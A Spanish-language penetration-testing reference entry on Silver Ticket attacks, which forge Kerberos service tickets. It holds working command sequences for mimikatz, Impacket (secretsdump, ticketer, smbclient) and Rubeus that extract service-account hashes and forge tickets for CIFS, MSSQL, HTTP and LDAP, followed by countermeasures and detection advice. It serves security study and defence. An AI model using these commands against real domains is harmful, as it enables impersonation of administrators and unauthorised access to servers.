---
title: Silver Ticket
slug: silver-ticket
aliases: [Silver Ticket, TGS forging, service ticket forge, mimikatz silver, computer account hash forge]
fase: [Post-Explotación]
plataforma: Windows
dificultad: Avanzada
mitre: [T1558.002]
related: [golden-ticket, pass-the-ticket, explotacion-kerberoasting, credential-dumping, ejecucion-remota-windows]
learning_refs: []
---

# Silver Ticket

## Descripción
Forja de un Ticket Granting Service (TGS) firmado con la clave NTLM o AES de una cuenta de servicio (típicamente la computer account de un servidor o una cuenta con SPN). A diferencia del Golden Ticket que forja un TGT y bypassa el AS-REQ, el Silver Ticket forja el TGS final y bypassa el TGS-REQ: el atacante construye localmente un ticket válido para un servicio específico (CIFS, HTTP, MSSQL, LDAP, HOST, etc.) y se lo presenta directamente al servidor objetivo, sin pasar por el KDC. **Ventaja sobre Golden Ticket**: no se necesita el hash de krbtgt (que requiere comprometer un DC), basta con el hash de UNA computer account del servidor objetivo. **Limitación**: el ticket sólo da acceso al servicio para el cual fue forjado, no es transferible. Es la siguiente parada lógica después de un Kerberoasting exitoso o de extraer hashes de la SAM/LSASS de un servidor.

## Herramientas
- **mimikatz** (`kerberos::golden /service:`) — la misma sintaxis que Golden Ticket pero con flag `/service:` para indicar el SPN objetivo
- **Impacket** (`ticketer.py -spn`) — forja desde Linux con output ccache
- **Rubeus** (`silver`) — variante específica en .NET
- **secretsdump.py** / **mimikatz** (`sekurlsa::logonpasswords`) — para extraer el hash NTLM/AES de la cuenta objetivo

## Comandos / Ejemplos

### Pre-requisito: extraer el hash de la cuenta de servicio objetivo
```bash
# Si la cuenta es la computer account del servidor (FILESERVER01$):
# Hash NTLM se obtiene del LSASS del propio servidor (mimikatz local) o
# desde el DC vía DCSync sobre esa cuenta.
impacket-secretsdump corp.local/dadmin:'Password!'@10.10.10.10 -just-dc-user 'FILESERVER01$'

# Si es una cuenta de servicio con SPN, también vía DCSync o Kerberoasting + crackeo
```

### Silver Ticket para CIFS (acceso a shares SMB del servidor)
```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:fileserver01.corp.local /service:cifs /rc4:<HASH_NTLM_FILESERVER01> /ptt
# Tras /ptt, el TGS para fileserver01\cifs queda en la sesión

# Probar acceso
dir \\fileserver01.corp.local\C$
# El servidor valida el TGS contra su propia clave (aceptada porque coincide), no contacta al DC
```

### Silver Ticket para MSSQL
```
mimikatz # kerberos::golden /user:sa /domain:corp.local /sid:S-1-5-21-... /target:dbserver01.corp.local /service:MSSQLSvc /rc4:<HASH_DBSERVER01> /ptt

# Conectar al SQL Server con autenticación Windows usando el ticket
sqlcmd -S dbserver01.corp.local -E
```

### Silver Ticket para HTTP (impersonation hacia un IIS)
```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:webserver01.corp.local /service:HTTP /rc4:<HASH_WEBSERVER01> /ptt

# Acceder al sitio que requiere autenticación Kerberos
curl --negotiate -u : http://webserver01.corp.local/admin/
```

### Silver Ticket con Impacket (Linux, formato ccache)
```bash
# Forjar TGS para CIFS de FILESERVER01
impacket-ticketer -nthash <HASH_NTLM_FILESERVER01> -domain-sid S-1-5-21-... -domain corp.local -spn cifs/fileserver01.corp.local Administrator
# Genera Administrator.ccache

export KRB5CCNAME=Administrator.ccache

# Acceder a shares
impacket-smbclient -k -no-pass corp.local/Administrator@fileserver01.corp.local
```

### Silver Ticket con Rubeus (Windows)
```powershell
Rubeus.exe silver /user:Administrator /domain:corp.local /sid:S-1-5-21-... /service:cifs/fileserver01.corp.local /rc4:<HASH> /ptt
```

### SPN frecuentes a forjar
- `cifs/<servidor>` — acceso a shares SMB, ejecución de tareas administrativas
- `host/<servidor>` — ejecución vía PsExec, WMIC, scheduled tasks
- `ldap/<dc>` — DCSync (peligroso, da control total de directorio)
- `MSSQLSvc/<servidor>:<puerto>` — autenticación a SQL Server
- `HTTP/<servidor>` — autenticación Kerberos a IIS, SharePoint
- `HOST/<servidor>` — equivalente a host/

## Contramedidas
- Habilitar y verificar la firma SMB y EPA (Extended Protection for Authentication) en servicios críticos para que rechacen tickets sin canal vinculado
- Forzar AES-256 en cuentas de servicio y deshabilitar RC4_HMAC; los Silver Tickets RC4 destacan en logs
- Detección por log de servidor objetivo: el TGS forjado no genera Event ID 4769 en el DC pero sí Event ID 4624 en el host destino. La discrepancia (logon sin TGS issuance correspondiente) es señal
- Microsoft Defender for Identity tiene firma específica para Silver Ticket (`Suspected forged Kerberos ticket`)
- Rotar contraseñas de computer accounts regularmente (default 30 días, no deshabilitar)
- Implementar Protected Users group para cuentas críticas (no se les emite TGT con RC4)
- Restringir privilegios de las cuentas de servicio (Service Accounts no deben ser admins locales si no es estrictamente necesario)
- Auditar SPNs registrados periódicamente y eliminar los obsoletos: cada SPN es un objetivo potencial de Kerberoasting → Silver Ticket
- Monitorear el uso de la PAC (Privilege Attribute Certificate) inválida vía MS14-068 patches y detección de mimikatz signatures en endpoints

## Referencias
- MITRE Corporation. (2024). *ATT&CK Technique T1558.002: Steal or Forge Kerberos Tickets: Silver Ticket*. https://attack.mitre.org/techniques/T1558/002/
- gentilkiwi. (s.f.). *mimikatz* [Software]. GitHub. https://github.com/gentilkiwi/mimikatz
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- GhostPack. (s.f.). *Rubeus* [Software]. GitHub. https://github.com/GhostPack/Rubeus
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
